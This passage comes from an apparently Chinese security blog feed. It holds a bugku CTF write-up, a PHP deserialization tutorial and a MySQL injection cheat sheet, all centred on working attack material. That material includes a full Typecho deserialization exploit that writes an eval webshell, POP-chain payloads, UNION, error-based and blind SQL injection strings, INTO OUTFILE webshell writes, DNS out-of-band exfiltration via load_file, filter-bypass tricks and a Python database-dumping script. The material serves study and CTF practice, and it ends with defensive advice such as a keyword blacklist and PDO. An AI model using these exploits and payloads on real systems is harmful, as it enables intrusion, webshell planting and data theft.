bugku导航稍微浏览了一下基本页面，顺手吧目录扫描器开启，发现两个登录的地方：一个是首页用户登录的，放进sqlmap跑了一下，无果。还有一个地方是后台登录的页面:http://120.24.86.145:9006/admin/login.php#post，burpsuite抓了个包保存到本地，试了一下username参数1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username 上webshell：1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugku导航\bp.txt&quot; -p username --os-shell 但是都上传失败了…没爆出网站路径不过我爆了一下敏感数据，拿到了后台管理员账号：后台有很多图片上传的地方，不过上传成功后，都会被改名成.png找到了个添加广告的地方，随便插了一个一句话木马：插入失败了，又是sql…试试这样：没找到广告插在哪个页面了….后来，扫了一下备份文件，把他源码下下来了。flag在根目录。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化总结]]></title>
    <url>%2F2018%2F02%2F19%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[起因：最近日站的时候，对一个typecho博客经历几番波折之后，最后找了个typecho反序列化漏洞的exp、写了个webshell..开心的不得了…带着对反序列化漏洞满满的好奇心学习了一番。批量getshell脚本已发布：github 0x01：相关基础：1.序列化和反序列化相关知识：1.1什么是(反)序列化：序列化是将变量(对象)转换为可保存或传输的字符串的过程；反序列化就是在适当的时候把这个字符串再转化成原来的变量使用。 1.2php(反)序列化常见的函数：Serialize、Unserialize、json_encode、json_decode。 1.3序列化之后的格式：a - array：12a:&lt;length&gt;:&#123;key,value pairs&#125;a:1:&#123;i:1;s:1:&quot;a&quot;;&#125; b - boolean： d - double i - integer o - object:12O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125; //说明person对象中name属性为Null、age属性为19，sex属性为Null s - string12s:length:&quot;value&quot;;s:1:&quot;a&quot;; N - null1N; 2.php对象常见的魔幻函数 __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep:序列化对象之前就调用此方法(其返回需要一个数组) __wakeup:反序列化恢复对象之前调用该方法 __call:当调用对象中不存在的方法会自动调用该方法。 __get:在调用私有属性的时候会自动执行 更多见：http://php.net/manual/zh/language.oop5.magic.php 测试： 3.php_session序列化和反序列化相关知识3.1 php_session处理器 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值。 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值设置方式：在php_ini中session.serialize_handler(PHP_INI_ALL) 设置，也可以在代码中设置：1ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); 各类存储方式示例：代码：123456&lt;?phpini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);?&gt; 当我传入?a=O:4:”pass”:0:{}时： php处理器存储的为：a|s:15:”O:4:”pass”:0:{}”; php_serialize处理器存储的为：a:1:{s:1:”a”;s:15:”O:4:”pass”:0:{}”;} php_binary处理器存储的为：(乱码了..自己测试吧) 3.2.php_ini中与php_session相关的配置知识 session.save_path = “” //设置session的存储路径 session.auto_start = boolen //指定会话模块是否在请求开始时启动一个会话，默认0(不启动) session.serialize_handler = string //指定序列化、反序列化处理器 0x02.常见的漏洞：1 将传来的序列化unserilize，造成魔幻函数执行。demo1： 由bugku的一个题启发而写的一个缩略版的demo，原题链接：http://120.24.86.145:8006/test1/ 1234567891011121314&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$password = unserialize($_GET['password']); echo $password; &lt;/script&gt; 关键点：当对象被当作字符串使用时调用__tostring()魔幻函数，所以如果我们给password传入一个序列化的对象，那么echo $password 就会调用魔幻函数。构造payload：123456789101112131415&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$obj = new Flag();$obj-&gt;file = "Flag.php"; echo serialize($obj);&lt;/script&gt; 生成：1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 最后读出flag.php demo2:1234567891011&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __wakeup()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; &#125;&#125;unserialize($_GET['password']); &lt;/script&gt; 这个例子是利用的反序列化恢复对象之前会调用__wakeup()，所以构造payload方法和demo1中一样。将拿到的序列化字符传入：1http://localhost:9096/test1.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 即可得到flag.php中的文件 当然还有其他魔幻函数：__construct、__destruct都行 总的来说：①：有可控的数据被反序列化②：有魔幻函数中敏感代码被执行。 2 php session处理器设置不当的漏洞。 起源于一道CTF，题目传送门:http://web.jarvisoj.com:32784/ 题目源码：12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 第一眼看到这个题的时候很懵逼…. 没有数据可以输入的地方…然后琢磨了一下wp….. 感觉发现了新大陆… 从phpinfo中可以发现1session.serialize_handler = php_serilize 而代码中设置的1ini_set('session.serialize_handler', 'php'); 从上文介绍相关处理器的时候可以知道：PHP处理器：a为session的键名，|后面为经过serialize处理的键值而php_serialize处理器：这其中php_serialize有一个特性，就是可以在字符串变量中储存 | 符号，然后当我们以php_serialize格式存入|O:4:”pass”:0:{}再以php处理器处理：即变成了[“a:1:{s:1:”a”;s:16:””]为键名，test对象为值。demo3(上述过程具体实现代码)：12345&lt;?php//ini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];?&gt; 实现步骤：1.设置php_ini中的session.serialize_handler = php_serialize，访问http://localhost:9096/test1.php?a=|O:4:&quot;test&quot;:0:{},即写入session。2.将上述代码注释去掉，并给$_SESSION[‘a’] = $_GET[‘a’];加上注释，即可看到php和php_serialize处理|的漏洞。 所以这里就可以利用这个特性给网页传入一个构造的php_serialize格式的session，然后让php解析器将|后的数据解析成”值”，以达到代码执行目的。然后我们利用这个特点写入一个session(以php_serialize格式)，然后让该页面以php方式处理，从而给$mdzz赋值，获取敏感信息。demo4：test1.php123456789101112131415&lt;?phpini_set('session.serialize_handler', 'php');session_start();//$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);class Test&#123; function __construct()&#123; echo "__constrct"; &#125; function __destruct()&#123; echo "__destruct"; eval(phpinfo()); &#125;&#125;?&gt; 本地事先存储了以php_serilize格式的session：a:1:{s:1:”a”;s:16:”|O:4:”Test”:0:{}然后访问test1.php正好符合上述题目中的eval函数中的代码执行 总的来说 ：其实这种漏洞就是session序列化及反序列化处理器设置不当造成。本质上是它们对处理“|”的差异造成。如果以php_serilize方式存入，比如我们构造出’|’ 伪造的序列化值存入，但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（’|’之前当作键名，’|’之后当作键值）其次如果想要利用的话，就是找到注入点，将我们构造的session注入进去。 其实我还是有点疑问的那么为什么php处理器处理的时候会执行session中的值呢？猜想：与session_start或者php处理器有关暂时还没有捣鼓出来… 0x03.如何寻找注入点将数据注入到session上面说的那个CTF题原理已经知道了，但是并不知道从哪注入session。就我了解的而言，有以下几种写入session的途径 1.通过配置不当造成的session可控 参考：https://bugs.php.net/bug.php?id=71101当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。 我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候PHP会将文件名保存在$_SESSION中所以构造一个提交文件的表单：12345&lt;form action =“http://web.jarvisoj.com:32784/index.php”method =“POST”enctype =“multipart/form-data”&gt; &lt;input type =“hidden”name =“PHP_SESSION_UPLOAD_PROGRESS”value =“1”/&gt; &lt;input type =“file”name =“file”/&gt; &lt;input type =“submit”/&gt;&lt;/form&gt; 然后构造一个序列化的数据：123456789&lt;?phpini_set('session.serialize.handler','php');session_start();class OowoO&#123; public $mdzz = 'payload';&#125;$obj = new OowoO();echo serialize($obj);?&gt; 即可使得析构函数中的eval()执行任意代码。 0x04：构造注入链：pop1.POP链原理简介： 在反序列化中，我们能控制的数据就是对象中的属性值，所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，即POP( Property Oriented Programming)。在反序列化漏洞利用中，最理想的情况就是漏洞能利用的点在那几个魔幻函数中，而实际上往往是从这几个魔幻函数开始，逐步的跟进这个函数中调用的函数，直到找到可以利用的点。 试想一下，如果上面那个CTF题目的代码执行函数eval()函数不在__destruct这类魔幻函数中，而是在一个普通的方法中，我们就没办法直接利用它执行代码了。这个时候就需要构造一个链，链接到我们需要执行的函数eval()。 demo5(模拟了一个简单的场景)：12345678910111213141516171819202122232425&lt;?phpclass OowoO&#123; protected $obj; function __destruct() &#123; //$obj = new test1; 这里可以控制$obj为任意对象 $this-&gt;obj-&gt;a(); &#125;&#125;class test1&#123; function a()&#123; echo "123"; &#125;&#125;class test2&#123; private $data; function a()&#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET['a']);?&gt; 利用：12345678910111213&lt;script language="php"&gt;class OowoO&#123; protected $obj; public function __construct()&#123; $this-&gt;obj = new test2(); &#125;&#125;class test2&#123; private $data = "phpinfo();";&#125;echo urlencode(serialize(new OowoO()));&lt;/script&gt; 结果： 值得注意的是，反序列化可以控制类的属性，无论private还是public。但是这里有个坑，如果类中存在protected或者private属性的时候，序列化的时候会产生空字节，所以记得urlencode一下，payload才会生效。demo6：123456789&lt;?phpclass test&#123; private $a="a"; protected $b="b"; public $c="c";&#125;echo urlencode(serialize(new test()));?&gt; 总的来说：如果魔幻函数中没有漏洞利用点，但是他调用了其他对象(意味着实例化了该对象)中的方法A，由于上述demo5中我们传入的反序列化数据可以实例化任意对象，所以我们可以全局寻找一个和方法A同名的方法，然后逐个查看其他同名方法A中是否含有可利用的点。 2.typecho反序列化漏洞分析：漏洞文件为根目录下的install.php，第283行:12345$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));$type = explode('_', $config['adapter']);$type = array_pop($type);$installDb = new Typecho_Db($config['adapter'], $config['prefix']);$installDb-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); 从cookie中将__typecho_config的值取出，然后在Typecho_Db中实例化。这里就是漏洞的注入点，下面就需要找到漏洞的利用点，接着搜寻魔幻函数 __construct、__destruct、__wakeup。 在/var/Typecho/Db.php中Typecho_Db类，代码第114行，找到一个__construct(1)可以利用，因为$adapterName变量存在字符串拼接如果给它反序列化传入一个对象的话，会调用 __tostring函数(如果存在的话)。1234public function __construct($adapterName, $prefix = 'typecho_')&#123; $this-&gt;_adapterName = $adapterName; $adapterName = 'Typecho_Db_Adapter_' . $adapterName; 可以发现在同文件下的第134行，实例化了$adapterName，会调用__tostring(2)1$this-&gt;_adapter = new $adapterName(); 全局搜索__tostring后，在/var/Typecho/Feed.php中Typecho_Feed类可以发现__tostring(2)方法：290行：1234567891011foreach ($this-&gt;_items as $item) &#123; $content .= '&lt;entry&gt;' . self::EOL; $content .= '&lt;title type="html"&gt;&lt;![CDATA[' . $item['title'] . ']]&gt;&lt;/title&gt;' . self::EOL; $content .= '&lt;link rel="alternate" type="text/html" href="' . $item['link'] . '" /&gt;' . self::EOL; $content .= '&lt;id&gt;' . $item['link'] . '&lt;/id&gt;' . self::EOL; $content .= '&lt;updated&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/updated&gt;' . self::EOL; $content .= '&lt;published&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/published&gt;' . self::EOL; $content .= '&lt;author&gt;&lt;name&gt;' . $item['author']-&gt;screenName . '&lt;/name&gt;&lt;uri&gt;' . $item['author']-&gt;url . '&lt;/uri&gt;&lt;/author&gt;' . self::EOL; 在该段代码的倒数第三行中，如果构造$item[‘author’]是一个对象，screenName是其私有属性，则会调用__get(3)方法。 然后在/var/Typecho/Request.php中Typecho_Request类中 __get(3)方法：226行1234public function __get($key)&#123; return $this-&gt;get($key);&#125; 调用了get方法：295行1234567891011121314151617public function get($key, $default = NULL)&#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value);&#125; 跟进一下_applyFilter(),在该文件的159行:1234567private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; 调用了call_user_func($filter,$value)函数，找到了可以利用的点了。 反过来分析：回溯查看一下$value变量的来源：由Typecho_Request类中的$_params传入。然后$filter在代码的120行有定义：1private $_filter = array(); 所以可以直接对该属性赋值。 再来考虑一下如何触发__get(3)方法： 然后就可以把$_items数组所在的Typecho_Feed类，实例化传给$adapter，从而触发\_tostring(2)，然后__construct(1)自动执行，即构成了完整的一条攻击链。 总的来说，现在就很好理解这些数组的嵌套关系了。12345678910111213141516171819202122232425262728293031323334Array( [adapter] =&gt; Typecho_Feed Object ( [_type:Typecho_Feed:private] =&gt; RSS 2.0 [_version:Typecho_Feed:private] =&gt; 1 [_charset:Typecho_Feed:private] =&gt; UTF-8 [_lang:Typecho_Feed:private] =&gt; en [_items:Typecho_Feed:private] =&gt; Array //$_itemss数组 ( [0] =&gt; Array //$item数组 ( [author] =&gt; Typecho_Request Object //$item[&apos;author&apos;]赋予一个对象值，触发__get() ( [_params:Typecho_Request:private] =&gt; Array ( [screenName] =&gt; file_put_contents(&apos;Passer6y.php&apos;, &apos;&lt;?php eval($_POST[1]);?&gt;&apos;) ) [_filter:Typecho_Request:private] =&gt; Array ( [0] =&gt; assert ) ) ) ) ) [prefix] =&gt; th1s) EXP(copy from Ph0rse大佬)：1234567891011121314151617181920212223242526272829303132333435&lt;?php//当__get方法执行时，使用assert函数调用file_put_contents函数，写入木马class Typecho_Request&#123; private $_params = array('screenName' =&gt; "file_put_contents('Passer6y.php', '&lt;?php eval(\$_POST[1]);?&gt;')"); private $_filter = array('assert');&#125;//构造Feed类，使__get方法执行class Typecho_Feed&#123; const RSS2 = "RSS 2.0"; private $_type; private $_version; private $_charset; private $_lang; private $_items = array(); public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')&#123; $this-&gt;_version = $version; $this-&gt;_type = $type; $this-&gt;_charset = $charset; $this-&gt;_lang = $lang; &#125; public function addItem(array $item)&#123; $this-&gt;_items[] = $item; &#125;&#125;$class1 = new Typecho_Feed(1);$class2 = new Typecho_Request();$class1-&gt;addItem(array('author' =&gt; $class2));$exp = array('adapter' =&gt; $class1, 'prefix' =&gt; 'th1s');echo base64_encode(serialize($exp));?&gt; 0x05.如何防御1.过滤：试想一下，当unserialize执行的时候，会调用自动__wakeup魔幻函数，我们可以利用这点，对用户可控的数据进行严格过滤，使之不能成功控制属性值。 2.使用get_included_files函数查看是否有漏洞的类被包含了 3.尽量使用json_endcode/json_decode来取代 参考资料：1.漏洞分析之Typecho二连爆2.PHP序列化3.一道反序列化CTF引起的思考4.POP链的构造5.PHP中SESSION反序列化机制详解6.Typecho反序列化漏洞导致前台getshell7.通过PHP反序列化进行远程代码执行8.POP链和序列化，反序列化操作 9.php对象注入总结10.PHP反序列化漏洞成因及漏洞挖掘技巧与案例]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySql Injection Conclusion]]></title>
    <url>%2F2017%2F12%2F23%2FSql%20injection%20Conclusion%2F</url>
    <content type="text"><![CDATA[0x02 基于有正确回显的注入1.判断注入点、注入位置2.判断是否被过滤，绕过3.order by联合查询，找到对应的列数4.联合查询注入：这里假设有三个字段①爆库： id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+ ②爆表名：这里假设爆出了security数据库 id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos; --+ ③爆列名:假设爆出一个users表 id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+ ④爆数据： id=-1&apos; Union select 1,username,password from users limit 0,1 --+ Tips: 有时候可能当前页面数据库和敏感信息数据库不是同一个库，所以有时候会这样写id=-1’ Union select 1,username,password from security.users limit 0,1 –+或者id=-1’ Union select 1,username,password from `users` limit 0,1 –+ 0x03 基于构造错误sql语句的报错注入1. 需要知道以下几个函数： ①Group by: 分组，合并相同的，并且按字母顺序排列。 ②rand() // 随机函数（0，1） ③floor() //取整函数 比如floor(1.2)=1 ④count() //汇总函数2. 原理: 简而言之就是利用 select count(),concat(floor(random(0)2))as key from…….group by key来报错。 即rand函数产生的随机数取整之后被 group by 子句被分为key值等于1 和0 两类，然后count()统计该类型下的个数 可以发现有时候回报错 我们就可以通过这种手段来获取敏感信息 那么问题来了：为什么会报错呢？ 双注入的原理，简单一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句（group by）就会把查询的一部分以错误的形式显示出来“通过floor报错的方法来爆数据的本质是group by语句的报错。 Group by 在分组的时候先会对前面的concat(floor(rand()*2))进行检测，无疑只有0和1 两种结果 进行分类，然后就会插入这条数据 插入的过程中又会再进行一次计算 如果检测所计算出来的数和插入时所计算出来的数不一样，这个时候就会报错。&lt;br /&gt; 3.实际操作(和有正确回显的操作类似)①爆库： ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ ②爆表名③爆列名④爆数据： ?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,(select password from users limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from information_schema.tables group by name) b) --+ 其他更多函数的报错注入extractvalue()、updatexml()、GeometryCollection()、polygon()、multipoint()、multilinestring()、multipolygon()、linestring()、exp()以后再深入练习吧.. 0x04基于文件读写权限的注入1.前提：需要my.ini(phpstudy中)里面的 secur_file_priv变量为空，不敢一般MySQL5.5.53之前的版本默认为空，之后的版本为null，所以说这种注入比较依赖MySQL的版本。可以使用：select @@secure_file_priv来查询权限。关于secur_file_priv变量更多： 如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。如果变量为空，则不会产生影响，引起不安全的配置。如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。 2.需要知道的函数：①Load_file：读文件②INTO DUMPFILE/OUTFILE：将表的内容导出为一个文本文件 Tips：INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 实际演示：select * from users into outfile ‘d:/1.txt’;select load_file(‘d:/1.txt’)3.实际操作(两种思路)①上菜刀 ?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos; --+ Tips：?在URL里面表示传参，如果一句话木马里面有 ?php 所以用get传参的 会将php当作变量。 ②改扩展名绕过操作： ?id=1&apos;)) union select 1,2,load_file(&apos;D:/phpStudy/www/1234.php&apos;) into outfile &apos;D:/phpStudy/www/123455.txt&apos; --+ 0x05盲注1.相关函数：①length():返回字符串的长度②substr():截取字符串 substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。③ascii():返回字符的ascii码④if():If(exor1,expr2,expr3)在mysql中是第一个参数成立的时候执行第二个参数，否则执行第三个参数2.实际操作：①判断注入点： Id=-1&apos; or sleep(5) --+ ②爆库： If(Ascii(substr(select schema_name from information_schema.schemata limit 0,1),1,1))=100,sleep(),null)as name ③爆表④爆字段⑤爆数据都是一样的套路 Tips：substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序。 0x06多种位置的注入：其实都是一样的方法，只是位置不一样。一般来说，有以下几种注入位置：1.Get、Post2.UA头3.referer头4.cookie 0x07带外通道：什么是带外通道注入？ 使用背景：在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。一种获取数据的有效方法是使用带外通道能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息一般可以提取数据的途径:通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等 对于MySQL而言同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见0x03中对该变量的介绍。利用条件： 全局变量secure_file_priv = ‘ ‘ 可以用SQL server连接到mysql数据库 使用DNS解析提取数据在mysql中会对查询语句中的ip和网址尝试DNS解析。例如： select load_file(concat(‘\\\\’,version()’yoursite.com\\a.txt’)); 然后我们可以通过抓包看MySql发出的DNS查询数据或者使用网上现成的http://dnsbin.zhack.ca/ 就可以看到mysql发送过来的数据 0x08各种绕过姿势：绕过单引号 大小写绕过 ?id=1+UnIoN+SeLecT+1,2,3-- 替换绕过 ?id=1+UNunionION+SEselectLECT+1,2,3-- 注释绕过 ?id=1+un/**/ion+se/**/lect+1,2,3-- 特殊嵌入绕过 ?id=1/*!UnIoN*/SeLecT+1,2,3-- //在别的数据库中是注释但是在mysql中可以成功执行在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释 宽字节注入SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。在我们代码审计的过程中产生这个注入的原因有两个1.character_set_client=gbk(SET NAMES的误用)2.mysql_real_escape_string()的错误使用 二次urldecode注入绕过在我们代码审计的时候如果某处用了urldecode或者rawurldecode函数，则会二次解码(webserver和该函数)而绕过gpc或者是addslashes等过滤函数。 特殊字符绕过空格 Example: &apos;%0AUNION%0CSELECT%A0NULL%20%23 注释符&amp;引号 ①SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and/**/1=1; ②SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and&quot;1=1&quot;; 编码绕过URL编码、HEX编码、Base64编码 0x09利用工具1.sqlmap2.Pangolin（穿山甲）3.Domain等等 0x10如何用python写工具？在我简单学习了requests库、和re库之后，编写了一个简单的脚本(第一次写bug有点多、局限也很多..) #coding=UTF-8 import re import requests from bs4 import BeautifulSoup import sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) def getHTMLText(url): try: r = requests.get(url) r.raise_for_status() r.encoding = r.apparent_encoding return r.text except: print(&quot;getHTMLText error&quot;) return &quot;getHTMLText right&quot; #捕捉返回的错误，判断注入点 def sqlloc_error(html,url,lists): try: error = re.search(r&apos;syntax&apos;,html) if error: lists.append(url) except: return &quot;rightback error&quot; #构造注入点的url def testsql(start_url,lists): injects = [&apos;\&apos;&apos; , &apos;\&quot;&apos; ,&apos;)&apos;, &apos;\&apos;)&apos;, &apos;\&quot;)&apos;] for inject in injects: url = start_url + inject html = getHTMLText(url) sqlloc_error(html,url,lists) #捕捉爆库返回的字段 def sqlrep_back(html,payload_reps): try: soup = BeautifulSoup(html,&quot;html.parser&quot;) Rep = soup.select(&quot;font &gt; font&quot;) NRep = Rep[0].text NNRep = NRep.split(&apos;:&apos;)[2] num = len(NNRep.split(&apos;,&apos;)) for i in range(num): payload_reps.append(NNRep.split(&apos;,&apos;)[i]) print(payload_reps[i]) except: return &quot;sqlrep_back error&quot; #爆库(这里还没有实现自动判断字段数，下面的payload也可以写成批量) def BoomRepository(list,payload_reps): newurl = list + &quot; union select 1,2,group_concat(schema_name) from information_schema.schemata --+&quot; html = getHTMLText(newurl) sqlrep_back(html,payload_reps) #捕捉爆出的表 def sqltab_back(html,payload_tables): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Tab = soup.select(&quot;font &gt; font&quot;) NTab = Tab[0].text NNTab = NTab.split(&apos;:&apos;)[2] num = len(NNTab.split(&apos;,&apos;)) for i in range(num): payload_tables.append(NNTab.split(&apos;,&apos;)[i]) print(payload_tables[i]) except: print(&quot;sqltab_back error&quot;) #爆表 def BoomTable(list,payload_columns,payload_tables,payload_reps): for payload_rep in payload_reps: newurl = list + &quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;&quot; + payload_rep + &quot;&apos; --+&quot; print(&quot;-----------正在爆&quot; + payload_rep + &quot;库的表-----------&quot;) html = getHTMLText(newurl) sqltab_back(html,payload_tables) for payload_table in payload_tables: print(&quot;-------------------------正在爆&quot; + payload_rep +&quot;库的&quot; + payload_table + &quot;表的字段-------------------------&quot;) Boomcolumn(list, payload_tables,payload_columns) #捕捉爆出的字段 def sqlcol_back(html,payload_columns): try: soup = BeautifulSoup(html,&apos;html.parser&apos;) Col = soup.select(&quot;font &gt; font&quot;) NCol = Col[0].text NNCol = NCol.split(&apos;:&apos;)[2] num = len(NNCol.split(&apos;,&apos;)) for i in range(num): payload_columns.append(NNCol.split(&apos;,&apos;)[i]) print(payload_columns[i]) except: print(&quot;sqlcol_back error&quot;) #爆字段 def Boomcolumn(list, payload_tables,payload_columns): for payload_table in payload_tables: newurl = list + &quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;&quot; + payload_table + &quot;&apos; --+&quot; html = getHTMLText(newurl) sqlcol_back(html, payload_columns) def main(): lists = [] #判断是否有注入点的url payload_reps = [] #爆出来的库的列表 payload_tables = [] #爆出来的表的列表、 payload_columns = [] #爆出来的字段 start_url = &apos;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&apos; testsql(start_url,lists) print(&quot;-----------------------正在爆库--------------------------&quot;) BoomRepository(lists[0], payload_reps) print(&quot;------------------------正在爆表--------------------------&quot;) BoomTable(lists[0], payload_columns, payload_tables, payload_reps) main() 0x11如何防御？ 引发SQL注入漏洞的原因：动态SQL或者将SQL查询组装成包含受用户控制的输入的字符串并提交给数据库 使用黑名单验证我们进行SQL注入的时候肯定离不开这些关键词： and、or、order insert、into delete replace、update union、select load_file、outfile 和一些特殊符号 具体的实现代码： private function filter_keyword( $string ) { $keyword=&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|and|union|order|or|into|load_file|outfile&apos;; $arr = explode( &apos;|&apos;, $keyword ); $result = str_ireplace( $arr, &apos;&apos;, $string ); return $result; } 当然这里这是一个基本的思路，实际环境中还需要更强大的正则来进行黑名单过滤。 正确使用过滤方式1.gpc/runtime魔术引号：bug来源无非两种方式，一种是从类似于get、post等中被动式的获得参数;还有一种是主动的获得参数，比如读取远程页面或者文件。所以gpc/runtime在这就很重要了。2.addslashes函数(字符型防御)、mysql_[real_]escape_string函数、intval函数等等 使用预处理语句：PDO 什么是PDO？PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持pdo。你可以把pdo看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用pdo连接mysql，也可以用它连接oracle。并且pdo很好的解决了sql注入问题。 为什么要使用PDO查询?使用传统的 mysql_connect 、mysql_query方法来连接查询数据库时，如果过滤不严紧，就有SQL注入风险。虽然可以用mysql_real_escape_string()函数过滤用户提交的值，但是也有缺陷。而使用PHP的PDO扩展的 prepare 方法，就可以避免sql injection 风险。 具体实现方法$dbh = new PDO(&quot;mysql:host=localhost; dbname=demo&quot;, &quot;user&quot;, &quot;pass&quot;); $dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //禁用prepared statements的仿真效果，确保传递到mysql服务器之前没有被PHP解析(禁止了所有可能的sql注入) $dbh-&gt;exec(&quot;set names &apos;utf8&apos;&quot;); $sql=&quot;select * from test where name = ? and password = ?&quot;; $stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($testname, $pass)); if ($exeres) { while ($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) { print_r($row); } } $dbh = null; 其实到这里我也不是很懂原理，然后搜索了一下资料了解了一下PHP与 mysql sever通讯细节： 为何PDO能防SQL注入？请先看以下PHP代码： &lt;?php $pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;charset=utf8&quot;,&quot;root&quot;); 